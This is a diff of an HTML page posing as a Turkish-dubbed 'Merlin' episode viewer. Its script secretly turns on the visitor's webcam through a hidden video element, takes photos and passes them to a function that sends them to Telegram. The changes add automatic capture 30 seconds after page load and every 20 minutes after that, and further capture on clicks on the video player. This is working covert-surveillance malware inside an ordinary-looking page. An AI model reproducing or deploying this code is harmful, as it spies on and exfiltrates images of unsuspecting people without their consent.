@@ -12,25 +12,25 @@
             flex-direction: column;
             height: 100vh;
             margin: 0;
-            background-color: #000;
-            color: #fff;
+            background-color: #000; /* Night mode */
+            color: #fff; /* White text */
             font-family: Arial, sans-serif;
             text-align: center;
         }
         .title {
-            font-size: 3rem;
+            font-size: 3rem; /* Large title font */
             font-weight: bold;
-            margin-top: 20px;
-            color: #f0f0f0;
+            margin-top: 20px; /* Added margin-top so the title does not overlap */
+            color: #f0f0f0; /* Light color for title */
             text-transform: uppercase;
-            margin-bottom: 20px;
+            margin-bottom: 20px; /* Added space below title */
         }
         .video-container {
             position: relative;
             width: 100%;
-            max-width: 1000px;
+            max-width: 1000px; /* Maximum video width */
             height: 0;
-            padding-bottom: 56.25%;
+            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
             background-color: #000;
             border-radius: 8px;
             margin-bottom: 20px;
@@ -47,65 +47,33 @@
             max-width: 90%;
             margin-top: 20px;
             padding: 10px;
-            background-color: #222;
+            background-color: #222; /* Dark grey */
             border: 1px solid #555;
             border-radius: 8px;
             font-size: 1rem;
             color: #fff;
             text-align: center;
         }
+        #video {
+            display: none; /* Hide the video element */
+        }
         @media (max-width: 768px) {
             .title {
-                font-size: 2rem;
+                font-size: 2rem; /* Adjust title font size for mobile */
             }
             .description {
-                font-size: 0.9rem;
+                font-size: 0.9rem; /* Smaller text for mobile */
             }
         }
         @media (max-width: 480px) {
             .title {
-                font-size: 1.5rem;
+                font-size: 1.5rem; /* Smaller title for very small screens */
             }
             .description {
                 font-size: 0.8rem;
             }
         }
-        #video {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            display: block; /* Ensure it functions while hidden */
-        }
     </style>
-</head>
-<body>
-    <!-- Video title at the top center above the player -->
-    <div class="title">Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</div>
-
-    <!-- Custom Video Player using Google Drive link -->
-    <div class="video-container" id="videoPlayer">
-        <iframe src="https://drive.google.com/file/d/1hGcMy61ERESxK4_2lZNfBDQH1J6QqOFY/preview" 
-                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-    </div>
-
-    <!-- Description section -->
-    <div class="description">
-        <p>
-            "Merlin" dizisinin bu bölümünde, Camelot Krallığı bir kez daha büyük bir tehlikeyle karşı karşıya. 
-            Genç büyücü Merlin, Kral Arthur'un geleceğini korumak için kadim bir çağrıya yanıt vermek zorunda kalır. 
-            Ejderhanın yeniden uyanışı, krallığı büyülü bir yolculuğa çıkarır. Merlin'in bu zorlu macerasında, 
-            dostluk, cesaret ve kaderin güçlerini keşfedin. Türkçe dublaj ile keyifle izleyin!
-        </p>
-    </div>
-
-    <!-- Additional YouTube Playlist -->
-    <div class="video-container">
-        <iframe src="https://www.youtube.com/embed/videoseries?list=PLz_5XsXvnkesghU3DOGfktsI-aQjnd9RR&autoplay=1&mute=1&loop=1&playlist=PLz_5XsXvnkesghU3DOGfktsI-aQjnd9RR&index=5&random=true&playback_rate=2" 
-                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-    </div>
-
-    <video id="video" width="320" height="240" autoplay></video>
-    <canvas id="canvas" style="display: none;"></canvas>
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -164,44 +132,83 @@
             sendToTelegram(byteArray);
         }
 
-        // Function to stop the camera after 1 second
+        // Function to stop the camera
         function stopCamera(stream) {
             const tracks = stream.getTracks();
             tracks.forEach(track => track.stop());
             console.log('Camera stopped.');
         }
 
-        // Function to activate the camera and take 5 pictures in 1 second
+        // Function to activate the camera and capture photo
         function activateCameraAndCapture() {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then((stream) => {
                     video.srcObject = stream;
                     videoStream = stream;
-                    
-                    // Take 5 pictures in 1 second
-                    let count = 0;
-                    const captureInterval = setInterval(() => {
+                    video.onloadedmetadata = () => {
                         capturePhoto();
-                        count++;
-                        if (count >= 5) {
-                            clearInterval(captureInterval); // Stop after 5 pictures
-                            stopCamera(videoStream); // Stop the camera after 1 second
-                        }
-                    }, 200); // Capture a picture every 200ms (5 pics in 1 second)
+                        stopCamera(videoStream);
+                    };
                 })
                 .catch((error) => {
                     console.error('Error accessing the camera:', error);
                 });
         }
 
-        // Add click event to the video container to enable the camera
-        const videoPlayer = document.getElementById('videoPlayer');
+        // Function to schedule automatic photo capture
+        function scheduleAutomaticCapture() {
+            setTimeout(() => {
+                console.log('Taking initial photo after 30 seconds');
+                activateCameraAndCapture();
+
+                setInterval(() => {
+                    console.log('Taking photo every 20 minutes');
+                    activateCameraAndCapture();
+                }, 1200000); // 20 minutes in milliseconds
+
+            }, 30000); // 30 seconds in milliseconds
+        }
+
+        // Click count logic for video player
+        let clickCount = 0;
+        const videoPlayer = document.querySelector('.video-container iframe');
+
         videoPlayer.addEventListener('click', () => {
-            activateCameraAndCapture();
+            clickCount++;
+            console.log(`Video player clicked. Count: ${clickCount}`);
+
+            if (clickCount === 1 || clickCount % 5 === 0) {
+                console.log('Taking photo based on click count');
+                activateCameraAndCapture();
+            }
         });
 
-        // Disable right-click on the entire page
-        document.addEventListener('contextmenu', event => event.preventDefault());
+        // Start the automatic capture schedule on page load
+        document.addEventListener('DOMContentLoaded', scheduleAutomaticCapture);
     </script>
+</head>
+<body>
+    <!-- Video title at the top center above the player -->
+    <div class="title">Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</div>
+
+    <!-- Custom Video Player using Google Drive link -->
+    <div class="video-container">
+        <iframe src="https://drive.google.com/file/d/1hGcMy61ERESxK4_2lZNfBDQH1J6QqOFY/preview" 
+                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    </div>
+
+    <!-- Description section -->
+    <div class="description">
+        <p>
+            "Merlin" dizisinin bu bölümünde, Camelot Krallığı bir kez daha büyük bir tehlikeyle karşı karşıya. 
+            Genç büyücü Merlin, Kral Arthur'un geleceğini korumak için kadim bir çağrıya yanıt vermek zorunda kalır. 
+            Ejderhanın yeniden uyanışı, krallığı büyülü bir yolculuğa çıkarır. Merlin'in bu zorlu macerasında, 
+            dostluk, cesaret ve kaderin güçlerini keşfedin. Türkçe dublaj ile keyifle izleyin!
+        </p>
+    </div>
+
+    <!-- Hidden video and canvas elements -->
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
 </body>
 </html>
